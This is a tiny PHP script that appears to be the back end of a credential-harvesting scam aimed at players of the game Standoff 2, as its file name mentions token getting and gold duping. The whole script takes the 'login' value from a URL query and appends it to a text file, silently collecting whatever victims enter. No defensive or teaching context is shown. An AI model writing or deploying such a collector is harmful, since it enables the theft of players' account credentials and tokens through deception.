<?php
 
$login = $_GET['login'];
 
$file = fopen('token get ggold dupe sniffer standoff 2.txt', 'a');
fwrite($file, $login . PHP_EOL);
fclose($file);
 
?>
